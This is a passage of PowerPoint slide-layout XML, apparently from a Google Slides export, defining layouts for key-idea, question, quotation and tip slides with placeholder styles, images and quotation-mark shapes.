  <p:cSld name="CUSTOM_22_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="282" name="Shape 282"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="688800" y="692100"/>
            <a:ext cx="7766400" cy="3759300"/>
          </a:xfrm>
          <a:prstGeom prst="bracePair">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="762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40"/>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5" name="Google Shape;285;p40"/>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286" name="Google Shape;286;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1450375" y="1039700"/>
            <a:ext cx="6244200" cy="3131700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr indent="-444500" lvl="0" marL="457200" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="●"/>
              <a:defRPr sz="3400"/>
            </a:lvl1pPr>
            <a:lvl2pPr indent="-444500" lvl="1" marL="914400" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="○"/>
              <a:defRPr sz="3400"/>
            </a:lvl2pPr>
            <a:lvl3pPr indent="-444500" lvl="2" marL="1371600" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="■"/>
              <a:defRPr sz="3400"/>
            </a:lvl3pPr>
            <a:lvl4pPr indent="-444500" lvl="3" marL="1828800" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="●"/>
              <a:defRPr sz="3400"/>
            </a:lvl4pPr>
            <a:lvl5pPr indent="-444500" lvl="4" marL="2286000" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="○"/>
              <a:defRPr sz="3400"/>
            </a:lvl5pPr>
            <a:lvl6pPr indent="-444500" lvl="5" marL="2743200" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="■"/>
              <a:defRPr sz="3400"/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-444500" lvl="6" marL="3200400" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="●"/>
              <a:defRPr sz="3400"/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-444500" lvl="7" marL="3657600" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="○"/>
              <a:defRPr sz="3400"/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-444500" lvl="8" marL="4114800" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buChar char="■"/>
              <a:defRPr sz="34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Key Idea">
  <p:cSld name="CUSTOM_4">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="287" name="Shape 287"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459100" y="1377600"/>
            <a:ext cx="2741400" cy="27414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9" name="Google Shape;289;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="900550" y="1861613"/>
            <a:ext cx="1856475" cy="1856475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="290" name="Google Shape;290;p41"/>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
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;p41"/>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estion">
  <p:cSld name="CUSTOM_4_1_2_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="292" name="Shape 292"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="293" name="Google Shape;293;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459100" y="1377600"/>
            <a:ext cx="2741400" cy="27414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4" name="Google Shape;294;p42"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="295" name="Google Shape;295;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1327875" y="2012779"/>
            <a:ext cx="1003696" cy="1489696"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p42"/>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otation">
  <p:cSld name="CUSTOM_4_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="297" name="Shape 297"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459100" y="1377600"/>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99" name="Google Shape;299;p43"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1074625" y="2258150"/>
            <a:ext cx="1473491" cy="980288"/>
            <a:chOff x="1074625" y="2258150"/>
            <a:chExt cx="1473491" cy="980288"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="300" name="Google Shape;300;p43"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1074625" y="2258150"/>
              <a:ext cx="704970" cy="980288"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="79682" w="57303">
                  <a:moveTo>
                    <a:pt x="12677" y="79681"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12677" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15652" y="75283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="71403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19920" y="67910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21343" y="64806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22378" y="62090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23025" y="59891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="58080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23542" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23542" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21084" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18627" y="55363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16428" y="54458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14229" y="53294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12159" y="52000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10219" y="50448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8408" y="48896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6726" y="47085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5304" y="45144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4010" y="43075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2846" y="40876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1811" y="38547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1035" y="36219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="33761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129" y="31174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="647" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2328" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3493" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6597" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8408" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10478" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15005" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17592" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20179" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22895" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25741" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28716" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28716" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31562" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37124" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39840" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42298" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44626" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46825" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48895" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50706" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52388" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53810" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54975" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56009" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56656" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57303" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57303" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="31562"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56915" y="34279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56398" y="37125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55751" y="39712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54845" y="42299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53940" y="44886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52776" y="47214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51611" y="49542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50189" y="51871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48766" y="54070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47214" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45532" y="58209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43850" y="60020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42039" y="61960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40229" y="63642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38288" y="65323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36477" y="66876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34537" y="68428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30786" y="71144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27035" y="73472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="75413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="77094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17204" y="78388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14617" y="79164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12677"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43"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1844733" y="2258150"/>
              <a:ext cx="703383" cy="980288"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="79682" w="57174">
                  <a:moveTo>
                    <a:pt x="12548" y="79681"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12548" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15523" y="75283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17980" y="71403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19791" y="67910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21214" y="64806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22249" y="62090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22896" y="59891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23284" y="58080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23413" y="56786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20955" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18498" y="55363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16299" y="54458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14100" y="53294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12030" y="52000"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10090" y="50448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="48896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6727" y="47085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5174" y="45144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3881" y="43075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2717" y="40876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1811" y="38547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1035" y="36219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388" y="33761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130" y="31174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1294" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2199" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3364" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4786" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6468" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8279" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10349" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14876" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17463" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22766" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25612" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28587" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28587" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31433" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34279" y="647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37124" y="1294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39711" y="2200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42169" y="3493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44627" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46826" y="6598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48766" y="8409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50706" y="10478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52259" y="12677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53681" y="15005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54975" y="17463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55880" y="20050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56657" y="22896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57045" y="25742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57174" y="28587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57045" y="31562"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56786" y="34279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56268" y="37125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55622" y="39712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54846" y="42299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53811" y="44886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52776" y="47214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51482" y="49542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50060" y="51871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48637" y="54070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47084" y="56139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45403" y="58209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43721" y="60020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41910" y="61960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40099" y="63642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38289" y="65323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36348" y="66876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34408" y="68428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30657" y="71144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26906" y="73472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23284" y="75413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20050" y="77094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17075" y="78388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14488" y="79164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548" y="79681"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12548"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2" name="Google Shape;302;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459100" y="4189950"/>
            <a:ext cx="2741400" cy="546900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" algn="ctr">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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="303" name="Google Shape;303;p43"/>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304" name="Google Shape;304;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2"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Tip or Answer">
  <p:cSld name="CUSTOM_4_1_1_1">
